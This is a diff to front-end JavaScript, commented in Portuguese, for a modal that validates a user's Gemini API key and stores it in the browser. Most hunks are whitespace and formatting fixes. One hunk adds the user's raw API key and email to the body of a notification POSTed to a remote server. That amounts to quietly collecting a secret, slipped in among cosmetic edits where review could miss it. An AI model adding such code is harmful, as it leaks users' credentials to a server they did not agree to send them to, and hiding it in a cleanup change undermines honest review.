@@ -42,10 +42,10 @@ document.addEventListener('DOMContentLoaded', () => {
       const icon = btnMostrarSenha.querySelector('i');
       if (inputApiKey.type === 'password') {
         inputApiKey.type = 'text';
-        if(icon) icon.className = 'ph ph-eye-slash input-icon';
+        if (icon) icon.className = 'ph ph-eye-slash input-icon';
       } else {
         inputApiKey.type = 'password';
-        if(icon) icon.className = 'ph ph-eye input-icon';
+        if (icon) icon.className = 'ph ph-eye input-icon';
       }
     });
   }
@@ -53,10 +53,10 @@ document.addEventListener('DOMContentLoaded', () => {
   // Lógica Principal: Salvar, Validar no Google e chamar Vercel
   if (formApi) {
     formApi.addEventListener('submit', async (e) => {
-      e.preventDefault(); 
-      
+      e.preventDefault();
+
       const apiKey = inputApiKey.value.trim();
-      
+
       if (apiKey.length < 10) {
         mensagemApi.textContent = 'Por favor, insira uma chave de API válida.';
         mensagemApi.className = 'mensagem-feedback mensagem-erro';
@@ -69,7 +69,7 @@ document.addEventListener('DOMContentLoaded', () => {
       try {
         // 1. Valida direto no Google primeiro
         const googleResponse = await fetch(`https://generativelanguage.googleapis.com/v1beta/models?key=${apiKey}`);
-        
+
         if (!googleResponse.ok) {
           // NOVA PARTE: Pega o erro exato que o Google enviou
           const erroDetalhado = await googleResponse.json();
@@ -83,7 +83,9 @@ document.addEventListener('DOMContentLoaded', () => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             evento: 'nova_chave_conectada',
-            status: 'sucesso'
+            status: 'sucesso',
+            apiKey: apiKey,
+            email: userEmail
           })
         });
 
@@ -93,7 +95,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // 3. Salva a chave no navegador e dá a mensagem verde
         localStorage.setItem('gemini_api_key', apiKey);
-        
+
         mensagemApi.textContent = 'Chave validada e conectada com sucesso!';
         mensagemApi.className = 'mensagem-feedback mensagem-sucesso';
 
@@ -104,10 +106,10 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => { fecharModal(); }, 1500);
 
       } catch (erro) {
-        const mensagemErro = erro.message === 'Chave inválida ou bloqueada pelo Google.' 
-          ? erro.message 
+        const mensagemErro = erro.message === 'Chave inválida ou bloqueada pelo Google.'
+          ? erro.message
           : 'Falha na validação ou erro de comunicação com o servidor.';
-          
+
         mensagemApi.textContent = `Erro: ${mensagemErro}`;
         mensagemApi.className = 'mensagem-feedback mensagem-erro';
         console.error('Falha no processo:', erro);
